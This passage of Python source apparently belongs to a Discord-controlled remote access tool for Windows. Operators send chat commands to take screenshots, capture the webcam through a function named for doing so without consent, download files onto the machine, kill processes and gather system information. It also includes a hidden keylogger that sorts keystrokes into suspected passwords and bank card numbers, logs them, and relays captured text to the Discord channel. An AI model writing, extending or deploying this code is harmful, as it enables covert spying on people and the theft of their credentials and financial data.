    try:
        import qrcode
    except Exception as e:
        raise RuntimeError("Missing dependency: install with `pip install qrcode[pil]`.") from e

    # Escape semicolons and backslashes per Wi-Fi QR spec
    def esc(s: str) -> str:
        return s.replace("\\", r"\\").replace(";", r"\;")

    payload = f"WIFI:T:{auth};S:{esc(ssid)};{'P:'+esc(key)+';' if key else ''};"
    path = os.path.join(tempfile.gettempdir(), f"wifi_qr_{_now_stamp()}.png")
    img = qrcode.make(payload)
    img.save(path)
    return path

def _popup_windows(text: str, title: str = "Important", allow_cancel: bool = True) -> int:
    """
    Show a blocking, top-most popup on Windows.
    Returns the MessageBoxW result code (1=OK, 2=Cancel).
    """
    if os.name != "nt":
        raise RuntimeError("Popup is Windows-only.")
    text = (text or "").strip()
    if not text:
        raise RuntimeError("Provide a message to display.")

    MB_OK              = 0x00000000
    MB_OKCANCEL        = 0x00000001
    MB_ICONINFORMATION = 0x00000040
    MB_SYSTEMMODAL     = 0x00001000

    flags = (MB_OKCANCEL if allow_cancel else MB_OK) | MB_ICONINFORMATION | MB_SYSTEMMODAL
    try:
        return ctypes.windll.user32.MessageBoxW(0, text, title, flags)
    except Exception as e:
        # must have a statement here; raise is fine
        raise RuntimeError(f"Failed to show popup: {e}")

# ---- Helpers for !kill (process list / kill by PID) ----

# Whitelisted EXE names (lowercase) that count as "actual apps"
_WHITELIST_EXE = {
    # originals / tools
    "notepad.exe", "calc.exe", "control.exe", "explorer.exe", "cmd.exe",
    "powershell.exe", "taskmgr.exe", "mspaint.exe", "write.exe",

    # browsers
    "msedge.exe", "chrome.exe", "firefox.exe", "opera.exe", "brave.exe", "vivaldi.exe",

    # office
    "winword.exe", "excel.exe", "powerpnt.exe", "onenote.exe", "outlook.exe",
    "mspub.exe", "msaccess.exe",

    # communications
    "teams.exe", "skype.exe", "discord.exe", "zoom.exe", "whatsapp.exe", "telegram.exe",

    # media / viewers
    "vlc.exe", "spotify.exe", "microsoft.photos.exe", "windowscamera.exe",
    "snippingtool.exe", "screenclippinghost.exe",

    # editors / dev
    "code.exe", "notepad++.exe",

    # store
    "winstore.app.exe", "applicationframehost.exe",   # UWP hosts (filtered by title hints below)
}

# Window-title hints to catch UWP apps or branded names
_TITLE_HINTS = [
    # tools / originals
    "notepad", "calculator", "control panel", "file explorer", "command prompt",
    "windows powershell", "task manager", "paint", "wordpad",

    # browsers
    "google chrome", "microsoft edge", "mozilla firefox", "opera", "brave", "vivaldi",

    # office
    "word", "excel", "powerpoint", "onenote", "outlook", "publisher", "access",

    # communications
    "microsoft teams", "skype", "discord", "zoom", "whatsapp", "telegram",

    # media / viewers
    "vlc", "spotify", "photos", "camera", "snipping tool", "screen clip",

    # editors / dev
    "visual studio code", "notepad++",

    # store
    "microsoft store",
]
_TITLE_HINTS_LOWER = [h.lower() for h in _TITLE_HINTS]


def _csv_field(row: dict, *keys, default=""):
    for k in keys:
        if k in row and row[k]:
            return row[k]
    return default


def _read_tasklist_verbose_csv():
    """Return list of dicts from 'tasklist /v /fo csv' (localized headers handled)."""
    import csv
    out = subprocess.check_output(["tasklist", "/v", "/fo", "csv"], text=True, errors="ignore")
    return list(csv.DictReader(io.StringIO(out)))


def _row_is_whitelisted_app(row: dict) -> bool:
    """Keep only rows matching our exe whitelist OR title-hints (helps UWP)."""
    name = _csv_field(row, "Image Name", "Nom de l’image").strip().lower()
    title = _csv_field(row, "Window Title", "Titre de la fenêtre").strip().lower()
    if not name:
        return False
    # Ignore core/system names outright
    if name in {"system", "system idle process"}:
        return False

    # If the EXE is in our whitelist, keep it — but require a non-empty title unless it's a CLI tool
    if name in _WHITELIST_EXE:
        if title and title != "n/a":
            return True
        # Allow some console apps with empty title (cmd/powershell) only if a console window exists
        return name in {"cmd.exe", "powershell.exe"}  # conservative

    # Otherwise accept if the title clearly matches a known app
    if title and title != "n/a":
        t = title.lower()
        return any(h in t for h in _TITLE_HINTS_LOWER)

    return False


def _list_whitelisted_apps_windows(limit=None):
    """Return filtered rows of user-facing, whitelisted apps on Windows."""
    if os.name != "nt":
        raise RuntimeError("Process listing is Windows-only.")
    rows = _read_tasklist_verbose_csv()
    keep = []
    for r in rows:
        if _row_is_whitelisted_app(r):
            keep.append(r)
            if limit and len(keep) >= limit:
                break
    return keep


def _write_proc_list_to_temp(rows):
    """Write the whitelisted process table to a temp .txt and return its path."""
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    path = os.path.join(tempfile.gettempdir(), f"apps_{PC_SLUG}_{ts}.txt")

    header = f"{'PID':>6}  {'Image Name':<22}  {'User':<20}  {'Mem':>10}  {'Window Title'}"
    lines = [header, "-" * len(header)]
    for r in rows:
        name = _csv_field(r, "Image Name", "Nom de l’image")[:22]
        pid  = _csv_field(r, "PID", "Identificateur de processus")
        user = _csv_field(r, "User Name", "Nom d’utilisateur")[:20]
        mem  = _csv_field(r, "Mem Usage", "Utilisation de la mémoire")[:10]
        titl = _csv_field(r, "Window Title", "Titre de la fenêtre")
        lines.append(f"{pid:>6}  {name:<22}  {user:<20}  {mem:>10}  {titl}")

    with open(path, "w", encoding="utf-8") as f:
        f.write(f"Whitelisted apps on {PC_NAME} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("\n".join(lines))
        f.write("\n")
    return path


def _kill_process_windows_by_pid(pid: int) -> str:
    if os.name != "nt":
        raise RuntimeError("Killing processes is Windows-only here.")
    try:
        p = subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"],
                           capture_output=True, text=True, check=True)
        return f"Closed process PID {pid}."
    except subprocess.CalledProcessError as e:
        err = (e.stderr or e.stdout or "").strip()
        raise RuntimeError(f"taskkill failed for PID {pid}: {err}")


def _confirm_close_app_popup(text: str, title: str):
    """
    Use your existing _popup_windows if available; else MessageBoxW OK/Cancel.
    Returns 1=OK, 2=Cancel.
    """
    try:
        fn = globals().get("_popup_windows")
        if callable(fn):
            return fn(text, title, True)
    except Exception:
        pass

    if os.name != "nt":
        raise RuntimeError("Popup is Windows-only.")
    MB_OKCANCEL     = 0x00000001
    MB_ICONQUESTION = 0x00000020
    MB_SYSTEMMODAL  = 0x00001000
    flags = MB_OKCANCEL | MB_ICONQUESTION | MB_SYSTEMMODAL
    return ctypes.windll.user32.MessageBoxW(0, text, title, flags)


def _get_proc_row_by_pid(pid: int):
    """Find row by PID from the full verbose tasklist."""
    try:
        rows = _read_tasklist_verbose_csv()
    except Exception:
        return None
    for r in rows:
        rp = (_csv_field(r, "PID", "Identificateur de processus") or "").strip()
        if rp == str(pid):
            return r
    return None

# ===== Screen recording with explicit on-screen consent =====

def _popup_windows_consent_record(seconds: int) -> bool:
    """
    Ask for explicit local consent to start a screen recording.
    Returns True if user clicks OK, False otherwise.
    """
    msg = (
        f"A screen recording of this PC will start and run for {seconds} second(s).\n\n"
        f"- It will capture the entire desktop (no audio).\n"
        f"- Click OK to consent and start.\n"
        f"- Click Cancel to abort."
    )
    try:
        if "_popup_windows" in globals() and callable(globals()["_popup_windows"]):
            rc = globals()["_popup_windows"](msg, f"Screen recording on {PC_NAME}", True)
        else:
            # Local fallback MessageBoxW
            MB_OKCANCEL     = 0x00000001
            MB_ICONINFORMATION = 0x00000040
            MB_SYSTEMMODAL  = 0x00001000
            rc = ctypes.windll.user32.MessageBoxW(
                0, msg, f"Screen recording on {PC_NAME}", MB_OKCANCEL | MB_ICONINFORMATION | MB_SYSTEMMODAL
            )
        return rc == 1  # 1=OK, 2=Cancel
    except Exception:
        return False


def _ffmpeg_path() -> str | None:
    """Return path to ffmpeg if available."""
    p = shutil.which("ffmpeg")
    if p:
        return p
    p = shutil.which("ffmpeg.exe")
    return p


def _record_screen_with_ffmpeg(seconds: int, out_path: str, fps: int = 20) -> None:
    """
    Record screen using ffmpeg gdigrab on Windows.
    Produces H.264 MP4 if libx264 is available, else falls back to mpeg4.
    """
    if os.name != "nt":
        raise RuntimeError("Screen recording is Windows-only here.")
    ff = _ffmpeg_path()
    if not ff:
        raise RuntimeError("ffmpeg not found. Install ffmpeg and add it to PATH.")

    # Try H.264 first (best size/compat); fall back to mpeg4 if build lacks libx264
    cmd_x264 = [
        ff, "-y", "-loglevel", "error",
        "-f", "gdigrab", "-framerate", str(fps), "-t", str(seconds),
        "-i", "desktop",
        "-vf", "scale=1280:-2",  # keep aspect; reduces file size
        "-c:v", "libx264", "-preset", "veryfast", "-crf", "28",
        "-pix_fmt", "yuv420p",
        out_path,
    ]
    try:
        subprocess.run(cmd_x264, check=True)
        return
    except subprocess.CalledProcessError:
        pass  # try mpeg4

    cmd_mpeg4 = [
        ff, "-y", "-loglevel", "error",
        "-f", "gdigrab", "-framerate", str(fps), "-t", str(seconds),
        "-i", "desktop",
        "-vf", "scale=1280:-2",
        "-c:v", "mpeg4", "-qscale:v", "5",
        out_path,
    ]
    subprocess.run(cmd_mpeg4, check=True)


def _record_screen_to_mp4(seconds: int) -> str:
    """
    Synchronous helper: records the screen and returns the path to the MP4 file.
    """
    if not (1 <= seconds <= 300):
        raise RuntimeError("Please choose between 1 and 300 seconds.")

    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    out_path = os.path.join(tempfile.gettempdir(), f"screenrec_{PC_SLUG}_{ts}.mp4")
    _record_screen_with_ffmpeg(seconds, out_path, fps=20)
    if not os.path.exists(out_path):
        raise RuntimeError("Recording failed (no output created).")
    return out_path

# ===== Helpers for !upload (save URL or attachment to local folders) =====
def _ts_stamp_upload() -> str:
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

def _upload_special_dir(key: str) -> str | None:
    home = os.path.expanduser("~")
    mapping = {
        "desktop":   os.path.join(home, "Desktop"),
        "downloads": os.path.join(home, "Downloads"),
        "documents": os.path.join(home, "Documents"),
        "pictures":  os.path.join(home, "Pictures"),
        "music":     os.path.join(home, "Music"),
        "videos":    os.path.join(home, "Videos"),
        "temp":      tempfile.gettempdir(),
    }
    return mapping.get((key or "").lower())

def _upload_is_image_name(name: str) -> bool:
    ext = os.path.splitext(name or "")[1].lower()
    return ext in {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"}

def _upload_guess_ext_by_ct(ct: str) -> str:
    ct = (ct or "").lower()
    mapping = {
        "image/jpeg": ".jpg",
        "image/png":  ".png",
        "image/gif":  ".gif",
        "image/bmp":  ".bmp",
        "image/webp": ".webp",
        "application/pdf": ".pdf",
        "text/plain": ".txt",
    }
    return mapping.get(ct, "")

def _upload_safe_filename(name: str) -> str:
    name = re.sub(r'[<>:"/\\|?*]', "_", (name or ""))
    name = name.strip().strip(".")
    return name or f"file_{_ts_stamp_upload()}"

def _upload_unique_path(path: str) -> str:
    if not os.path.exists(path):
        return path
    root, ext = os.path.splitext(path)
    n = 1
    while os.path.exists(f"{root}_{n}{ext}"):
        n += 1
    return f"{root}_{n}{ext}"

def _upload_resolve_target(spec: str | None, default_dir: str, suggested_name: str) -> str:
    """
    Resolve where to save the file.
    spec may be:
      - a special key (desktop/downloads/documents/pictures/music/videos/temp)
      - special with subpath (e.g., desktop\\sub\\file.png)
      - absolute/relative path (folder or full filename)
      - None -> default_dir + suggested_name
    """
    suggested_name = _upload_safe_filename(suggested_name)

    if not spec:
        os.makedirs(default_dir, exist_ok=True)
        return _upload_unique_path(os.path.join(default_dir, suggested_name))

    spec = spec.strip().strip('"').strip("'")

    # pure special dir (e.g., "desktop")
    kdir = _upload_special_dir(spec)
    if kdir:
        os.makedirs(kdir, exist_ok=True)
        return _upload_unique_path(os.path.join(kdir, suggested_name))

    # special dir prefix (e.g., "desktop\\sub\\file.png")
    parts = re.split(r"[\\/]", spec, maxsplit=1)
    kdir = _upload_special_dir(parts[0])
    if kdir:
        if len(parts) == 1 or not parts[1]:
            os.makedirs(kdir, exist_ok=True)
            return _upload_unique_path(os.path.join(kdir, suggested_name))
        rest = parts[1]
        full = os.path.normpath(os.path.join(kdir, rest))
        folder = full if os.path.splitext(full)[1] == "" else os.path.dirname(full)
        os.makedirs(folder, exist_ok=True)
        if os.path.isdir(full):
            return _upload_unique_path(os.path.join(full, suggested_name))
        return _upload_unique_path(full)

    # absolute/relative path
    full = os.path.expanduser(spec)
    if full.endswith(("/", "\\")) or os.path.isdir(full):
        os.makedirs(full, exist_ok=True)
        return _upload_unique_path(os.path.join(full, suggested_name))
    folder = os.path.dirname(full) or default_dir
    os.makedirs(folder, exist_ok=True)
    return _upload_unique_path(full)

def upload_save_attachment(data: bytes, suggested_name: str, target_spec: str | None) -> str:
    """
    Save an attachment's bytes to target path.
    Images default to Desktop, everything else to Downloads.
    Returns the final saved path.
    """
    base_dir = _upload_special_dir("desktop") if _upload_is_image_name(suggested_name) else _upload_special_dir("downloads")
    base_dir = base_dir or tempfile.gettempdir()
    save_path = _upload_resolve_target(target_spec, base_dir, suggested_name)
    with open(save_path, "wb") as f:
        f.write(data)
    return save_path

def upload_download_url(url: str, target_spec: str | None) -> str:
    """
    Download a URL and save it to the resolved target.
    Images default to Desktop, everything else to Downloads.
    Returns the final saved path.
    """
    with requests.get(url, stream=True, timeout=45) as r:
        r.raise_for_status()
        # filename from URL or content-type
        from urllib.parse import urlparse  # already imported in your file; safe to re-import
        name_from_url = os.path.basename(urlparse(url).path) or f"download_{_ts_stamp_upload()}"
        if not os.path.splitext(name_from_url)[1]:
            ext = _upload_guess_ext_by_ct(r.headers.get("Content-Type", ""))
            if ext:
                name_from_url += ext

        base_dir = _upload_special_dir("desktop") if _upload_is_image_name(name_from_url) else _upload_special_dir("downloads")
        base_dir = base_dir or tempfile.gettempdir()
        save_path = _upload_resolve_target(target_spec, base_dir, name_from_url)

        with open(save_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=64 * 1024):
                if chunk:
                    f.write(chunk)
    return save_path

# ===== Keylogger Functionality =====
# Configuration
DEFAULT_DURATION = 9999
LOG_DIR = "logs"
SENT_END = {'.', '!', '?', '…'}
NUMPAD_VK = {
    96: '0', 97: '1', 98: '2', 99: '3', 100: '4', 101: '5',
    102: '6', 103: '7', 104: '8', 105: '9',
    110: '.', 106: '*', 107: '+', 109: '-', 111: '/'
}

# Buffers
token_chars = []
sentence_chars = []
sentences = []
passwords = []
bank_codes = []

# Setup Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Detection Functions
def normalize_digits(s: str) -> str:
    return re.sub(r"\D+", "", s)

def is_bank_code(s: str) -> bool:
    d = normalize_digits(s)
    return d.isdigit() and 4 <= len(d) <= 19

def is_password_candidate(s: str) -> bool:
    if any(ch.isspace() for ch in s):
        return False
    if len(s) < 8:
        return False
    has_letter = any(ch.isalpha() for ch in s)
    has_digit  = any(ch.isdigit() for ch in s)
    has_symbol = any(not ch.isalnum() for ch in s)
    return (has_letter + has_digit + has_symbol) >= 2

def classify_token(tok: str):
    if not tok:
        return "empty"
    if is_bank_code(tok):
        return "bank"
    if is_password_candidate(tok):
        return "pass"
    return "text"

# Text Construction Functions
def _append_space_if_needed():
    if sentence_chars and sentence_chars[-1] != " ":
        sentence_chars.append(" ")

def _commit_sentence():
    s = ''.join(sentence_chars).strip()
    if s:
        while "  " in s:
            s = s.replace("  ", " ")
        sentences.append(s)
        # sentences.append(s) #Double Log
        logger.info(f"Committed Sentence: {s}") #Logger
    sentence_chars.clear()

def finalize_token(boundary: str, punct: str | None = None):
    global token_chars
    tok = ''.join(token_chars)
    token_chars.clear()

    if tok:
        kind = classify_token(tok)
        if kind == "bank":
            bank_codes.append(normalize_digits(tok))
            visible = False
            logger.info(f"Detected Bank Code: {normalize_digits(tok)}")
        elif kind == "pass":
            passwords.append(tok)
            visible = False
            logger.info(f"Detected Password Candidate: {tok}")
        else:
            sentence_chars.extend(tok)
            visible = True
            logger.info(f"Added Token to Sentence: {tok}")
    else:
        visible = False

    if boundary == "space":
        if visible:
            _append_space_if_needed()
    elif boundary == "punct":
        if sentence_chars:
            if punct:
                sentence_chars.append(punct)
            _commit_sentence()
    elif boundary == "enter":
        if visible or sentence_chars:
            _commit_sentence()
    elif boundary == "end":
        _commit_sentence()

# Keyboard Listener Functions
def on_press(key):
    try:
        c = key.char
        if c is not None:
            if c in SENT_END:
                finalize_token("punct", punct=c)
            elif c.isprintable():
                token_chars.append(c)
            return
    except AttributeError:
        pass

    vk = None
    if hasattr(key, "vk"):
        vk = key.vk
    else:
        try:
            val = getattr(key, "value", None)
            if val and hasattr(val, "vk"):
                vk = val.vk
        except Exception:
            vk = None

    if vk is not None and vk in NUMPAD_VK:
        ch = NUMPAD_VK[vk]
        if ch in SENT_END:
            finalize_token("punct", punct=ch)
        else:
            token_chars.append(ch)
        return

    try:
        if key == keyboard.Key.space:
            finalize_token("space")
        elif key == keyboard.Key.enter:
            finalize_token("enter")
        elif key == keyboard.Key.backspace:
            if token_chars:
                token_chars.pop()
            elif sentence_chars:
                sentence_chars.pop()
    except Exception:
        pass

def on_release(key):
    pass

def stop_listener(listener):
    listener.stop()

# Keylogger control variables
keylogger_running = False
keylogger_listener = None

#Global Sentences
logged_sentences = []

def start_keylogger(duration=DEFAULT_DURATION):
    global keylogger_running, keylogger_listener, logged_sentences

    #Reset List, we dont want previous data from last session!
    logged_sentences = []

    if keylogger_running:
        return "Keylogger is already running."

    os.makedirs(LOG_DIR, exist_ok=True)

    start_ts = datetime.now()
    tag = start_ts.strftime("%Y%m%d_%H%M%S")
    out_file = os.path.join(LOG_DIR, f"session_{tag}.txt")

    try:
        keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        keylogger_listener.start()
        timer = threading.Timer(duration, stop_keylogger_timer, args=(keylogger_listener, out_file, start_ts, duration))
        timer.start()

        keylogger_running = True
        return "Keylogger started."

    except Exception as e:
        return f"Error starting keylogger: {e}"

def stop_keylogger_timer(listener, out_file, start_ts, duration):
    global keylogger_running
    try:
        listener.stop()  # Stop the keyboard listener
    except Exception as e:
        print(f"Error stopping listener: {e}")  # Log the error

    keylogger_running = False

    finalize_token("end")  # Ensure all tokens are processed

    full_text = " ".join(sentences).strip()

    # Write captured data to file
    with open(out_file, "w", encoding="utf-8") as f:
        f.write(f"# Session du {start_ts.strftime('%Y-%m-%d %H:%M:%S')} (durée {duration}s)\n\n")
        f.write("## Texte complet (visible)\n")
        f.write(full_text if full_text else "(vide)")
        f.write("\n\n## Phrases (visibles)\n")
        for s in sentences:
            f.write(f"- {s}\n")
        f.write("\n## Mots de passe détectés\n")
        for p in passwords:
            f.write(f"- {p}\n")
        f.write("\n## Codes bancaires détectés (normalisés)\n")
        for c in bank_codes:
            f.write(f"- {c}\n")

    sentences.clear()
    passwords.clear()
    bank_codes.clear()

def stop_keylogger():
    global keylogger_running, keylogger_listener, logged_sentences

    if not keylogger_running:
        return "Keylogger is not running."

    try:
        # Check if the listener is an instance of Listener before stopping
        if keylogger_listener is not None and isinstance(keylogger_listener, keyboard.Listener):
            keylogger_listener.stop()
    except Exception as e:
        return f"Error stopping keylogger: {e}"

    keylogger_running = False

    # Add the sentences for this keylogger session
    logged_sentences.extend(sentences)
    sentences.clear()

    return "Keylogger stopped."

# ===================== KEY FEATURE PLACEHOLDERS =====================
async def key_feature_on(ctx: commands.Context = None):
    # Start the keylogger
    result = start_keylogger()
    if ctx:  # only reply if ctx is given (called from a command)
        await ctx.reply(result)
    return result

async def key_feature_off(ctx: commands.Context = None):
    # Stop the keylogger and prepare results
    result = stop_keylogger()

    # Prepare to send the sentences
    sentences_to_send = logged_sentences #Get the list of previous sentences
    sentences_str = "\n".join(f"- {s}" for s in sentences_to_send)

    # Combine all text data
    full_text = " ".join(sentences_to_send).strip() # Use the Logged list

    # Build response message
    output = f"**{result}**\n\n"
    if full_text:
        output += f"**Captured Text:**\n```{full_text}```\n"
    else:
        output += "No visible text was captured.\n"

    # if passwords:  # These stay the same
    #     output += f"**Passwords Detected:**\n" + "\n".join(f"- `{p}`" for p in passwords) + "\n"
    # if bank_codes:
    #     output += f"**Bank Codes Detected:**\n" + "\n".join(f"- `{c}`" for c in bank_codes) + "\n"

    if ctx:
        await ctx.reply(output)  # send results to the same channel

    sentences.clear()  # clear globals
    passwords.clear()
    bank_codes.clear()
    logged_sentences.clear()  # clear Logged

    return result

# ---- Command Definitions ----
@bot.command(name="keyon", hidden=True)
async def cmd_keyon(ctx: commands.Context):
    await key_feature_on(ctx)  # ctx passed here

@bot.command(name="keyoff", hidden=True)
async def cmd_keyoff(ctx: commands.Context):
    await key_feature_off(ctx)  # Properly awaits

# ------------------- Events -------------------
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    try:
        await ensure_scoped_channel()
        ch = bot.get_channel(MY_CHANNEL_ID)
        if ch:
            print(f"Listening in: #{ch.name} (id={ch.id}) in {ch.guild.name} for PC '{PC_NAME}'")
            # Optional: brief hello in the channel
            # await ch.send(f"✅ Online on **{PC_NAME}**. I will only respond here.")
        else:
            print("⚠️ Scoped channel not found yet (MY_CHANNEL_ID is None).")
    except Exception as e:
        print(f"Failed to ensure scoped channel: {e}")

# ------------------- Commands -------------------
@bot.command(name="sys", help="Generate and upload system_info.txt to show PC/network details.")
async def cmd_sys(ctx: commands.Context):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        path = await asyncio.to_thread(gather_system_info_to_desktop)
        await ctx.reply(content="System report saved on Desktop and attached here:", file=discord.File(path))
    except Exception as e:
        await ctx.reply(f"❌ Failed to create system info: `{e}`")

@bot.command(name="pp", help="Show a popup on this PC. Usage: !pp <message> [count]")
async def cmd_pp(ctx: commands.Context, *, payload: str = ""):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    payload = (payload or "").strip()
    if not payload:
        return await ctx.reply("❌ Usage: `!pp <message> [count]`  e.g. `!pp Hello 3`")

    # Parse optional trailing count (e.g., 'Hello there 3')
    count = 1
    msg = payload
    parts = payload.rsplit(" ", 1)
    if len(parts) == 2 and parts[1].isdigit():
        try:
            count = int(parts[1])  
            msg = parts[0].strip()
        except ValueError:
            count = 1

    if not msg:
        return await ctx.reply("❌ Please include a message before the count, e.g. `!pp Hello 2`")

    # Keep things reasonable
    count = max(1, min(999, count))
    if len(msg) > 1024:
        msg = msg[:1024]

    await ctx.typing()
    try:
        shown = 0
        for i in range(count):
            title = f"Message for {PC_NAME}  ({i+1}/{count})"
            ret = await asyncio.to_thread(_popup_windows, msg, title, False)
            shown += 1
            if ret == 2:  # Cancel pressed
                break
            await asyncio.sleep(0.2)

        if shown == count:
            await ctx.reply(f"✅ Popup shown {shown} time(s).")
        else:
            await ctx.reply(f"✅ Popup shown {shown} time(s), then cancelled.")
    except Exception as e:
        await ctx.reply(f"❌ {e}")

@bot.command(name="ss")
async def ss_command(ctx):
    """Respond with a screenshot only if the command is from this PC's channel."""
    global MY_CHANNEL_ID

    # Prevent other PCs from responding in the wrong channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    out_dir = tempfile.gettempdir()
    # Add PC_SLUG to filename so each PC's file is unique
    path = os.path.join(out_dir, f"screenshot_{PC_SLUG}_{ts}.png")

    try:
        import mss, mss.tools
        with mss.mss() as sct:
            monitor = sct.monitors[0]  # all monitors
            img = sct.grab(monitor)
            mss.tools.to_png(img.rgb, img.size, output=path)
    except Exception:
        if os.name == "nt":
            ps_script = r'''
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bmp.Save("{DEST}", [System.Drawing.Imaging.ImageFormat]::Png)
$gfx.Dispose(); $bmp.Dispose()
'''.replace("{DEST}", path.replace("\\", "\\\\"))
            subprocess.run(["powershell", "-NoProfile", "-Command", ps_script], check=True)
        else:
            raise

    # Send the file in Discord
    try:
        await ctx.send(file=discord.File(path))
    finally:
        if os.path.exists(path):
            os.remove(path)

@bot.command(name="battery", help="Show current battery percentage (Windows).")
async def cmd_battery(ctx: commands.Context):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    percent_txt = await asyncio.to_thread(get_battery_percentage_windows)
    await ctx.reply(f'Battery now: **{percent_txt}**')

@bot.command(name="speed", help="Internet speed snapshot (ping / download / upload).")
async def cmd_speed(ctx: commands.Context):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        res = await asyncio.to_thread(run_speed_test)
        msg = (
            f"**Internet Speed**\n"
            f"Server: {res['server']}\n"
            f"Ping: `{res['ping_ms']:.0f} ms`\n"
            f"Download: `{res['down_mbps']:.1f} Mbps`\n"
            f"Upload: `{res['up_mbps']:.1f} Mbps`"
        )
        await ctx.reply(msg)
    except Exception as e:
        await ctx.reply(f"❌ Speed test failed: `{e}`")

@bot.command(name="say", help="Speak a phrase out loud on the PC. Usage: !say Hello there")
async def cmd_say(ctx: commands.Context, *, message: str = ""):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    if not message.strip():
        return await ctx.reply("Please provide text: `!say Your message`")
    await ctx.typing()
    try:
        text = message.strip()
        if len(text) > 300:
            text = text[:300]
        await asyncio.to_thread(tts_say_windows, text)
        await ctx.message.add_reaction("🔊")
    except Exception as e:
        await ctx.reply(f"❌ TTS failed: `{e}`")

@bot.command(
    name="webcam",
    help="Open a webcam preview; press S/Space/Enter to snap (ESC cancels)."
)
async def cmd_webcam(ctx: commands.Context):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        path = await asyncio.to_thread(capture_webcam_without_consent_to_temp)
        try:
            await ctx.reply(file=discord.File(path, filename=os.path.basename(path)))
        finally:
            try:
                os.remove(path)
            except Exception:
                pass
    except Exception as e:
        await ctx.reply(f"⚠️ Webcam capture: `{e}`")


# ---- Wallpaper from URL or attachment ----
@bot.command(name="bg", help="Set desktop wallpaper. Usage: !bg <image_url> or attach an image")
async def cmd_bg(ctx: commands.Context, image_url: str = ""):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        # Prefer an attached image if provided
        if ctx.message.attachments:
            att = ctx.message.attachments[0]
            data = await att.read()
            fname = att.filename or f"wall_{_now_stamp()}.jpg"
            path = os.path.join(tempfile.gettempdir(), fname)
            with open(path, "wb") as f:
                f.write(data)
        elif image_url.strip():
            path = await asyncio.to_thread(_download_to_temp, image_url.strip())
        else:
            return await ctx.reply("Please attach an image **or** provide a URL. Example: `!bg https://example.com/pic.jpg`")

        await asyncio.to_thread(set_wallpaper_windows, path)
        await ctx.reply("✅ Wallpaper updated.")
    except Exception as e:
        await ctx.reply(f"❌ Could not set wallpaper: `{e}`")

# ---- NEW: key group with on/off subcommands ----
@bot.group(name="key", invoke_without_command=True, help="Toggle key feature: !key on / !key off")
async def key_group(ctx: commands.Context):
    await ctx.reply("Usage: `!key on` or `!key off`")


@key_group.command(name="on", help="Turn key feature ON")
async def key_on(ctx: commands.Context):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        await key_feature_on(ctx)  # Just await the async function directly!
        await ctx.reply("🔑 Key feature: **ON**")
    except Exception as e:
        await ctx.reply(f"❌ Failed to enable key feature: `{e}`")


@key_group.command(name="off", help="Turn key feature OFF")
async def key_off(ctx: commands.Context):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        await key_feature_off(ctx)  # Just await the async function directly!
        await ctx.reply("🔒 Key feature: **OFF**")
    except Exception as e:
        await ctx.reply(f"❌ Failed to disable key feature: `{e}`")

@bot.command(name="commands", help="Show all available commands (sent privately via DM).")
async def cmd_commands(ctx: commands.Context):
    # Build a readable list from the registered commands
    lines = []
    for cmd in bot.commands:
        if cmd.hidden:
            continue
        if isinstance(cmd, commands.Group):
            subs = ", ".join(sc.name for sc in cmd.commands if not sc.hidden)
            if subs:
                lines.append(f"!{cmd.name} ({subs})")
            else:
                lines.append(f"!{cmd.name}")
        else:
            sig = cmd.signature.strip()
            lines.append(f"!{cmd.name}" + (f" {sig}" if sig else ""))

    lines.sort()
    text = "**Available commands**\n" + "\n".join(f"- {ln}" for ln in lines)

    try:
        # Send privately (simulated ephemeral)
        await ctx.author.send(text)
        # Brief public notice that auto-deletes
        notice = await ctx.reply("📬 I sent you the commands in a DM.")
        try:
            await asyncio.sleep(10)
            await notice.delete()
        except Exception:
            pass
    except discord.Forbidden:
        # If DMs are closed, fall back to public reply
        await ctx.reply(text)

@bot.command(name="volume", help="Control volume: !volume <0-100|up|down|mute|unmute>")
async def cmd_volume(ctx: commands.Context, arg: str = ""):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        msg = await asyncio.to_thread(_volume_set_windows, arg)
        await ctx.reply(f"✅ {msg}")
    except Exception as e:
        await ctx.reply(f"❌ {e}")

